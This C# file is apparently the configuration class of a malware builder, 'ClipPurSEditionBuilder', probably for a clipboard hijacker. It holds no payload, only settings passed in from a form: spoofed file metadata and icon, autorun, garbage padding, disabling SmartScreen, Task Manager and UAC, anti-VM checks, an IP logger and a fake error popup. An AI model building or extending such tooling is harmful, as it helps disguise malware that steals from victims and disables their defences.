using System.Windows.Forms;

namespace ClipPurSEditionBuilder
{
    public class Build
    {
        #region String properties 

        public string BoxIcon { get; set; }
        public string BoxFileName { get; set; }
        public string AssTitle { get; set; }
        public string AssDescription { get; set; }
        public string AssCompany { get; set; }
        public string AssProduct { get; set; }
        public string AssCopyright { get; set; }
        public string AssVersion { get; set; }
        public string AssFileVersion { get; set; }
        public string GuidBox { get; set; }
        public string IPLoGGeR { get; set; }
        public string ErrorBox { get; set; }

        #endregion

        #region Control properties

        public Label BoxStatus { get; set; }
        public CheckBox RunCheckStatus { get; set; }
        public CheckBox DelayCheckStatus { get; set; }
        public CheckBox GarbageCheckStatus { get; set; }
        public CheckBox SmartOffCheckStatus { get; set; }
        public CheckBox TaskMgrOffCheckStatus { get; set; }
        public CheckBox UacOffCheckStatus { get; set; }
        public CheckBox AntiVMCheckStatus { get; set; }
        public CheckBox IPLogheckStatus { get; set; }
        public CheckBox FakeErrorCheckStatus { get; set; }
        public ComboBox ComboOutputExtension { get; set; }

        #endregion

        public Build
        (
            string icon, string filename, string title, string descr, string company, string product, string copy, string ver, string flver, string guid, string iplog, string error, Label status,
            CheckBox del, CheckBox garbage, CheckBox auto, CheckBox smart, CheckBox task, CheckBox uac, CheckBox antivm, CheckBox iplogger, CheckBox fake, ComboBox combo)
        {
            this.BoxIcon = icon;
            this.BoxFileName = filename;
            this.AssTitle = title;
            this.AssDescription = descr;
            this.AssCompany = company;
            this.AssProduct = product;
            this.AssCopyright = copy;
            this.AssVersion = ver;
            this.AssFileVersion = flver;
            this.GuidBox = guid;
            this.IPLoGGeR = iplog;
            this.ErrorBox = error;
            this.BoxStatus = status;
            this.RunCheckStatus = auto;
            this.DelayCheckStatus = del;
            this.GarbageCheckStatus = garbage;
            this.SmartOffCheckStatus = smart;
            this.TaskMgrOffCheckStatus = task;
            this.UacOffCheckStatus = uac;
            this.AntiVMCheckStatus = antivm;
            this.IPLogheckStatus = iplogger;
            this.FakeErrorCheckStatus = fake;
            this.ComboOutputExtension = combo;
        }
    }
}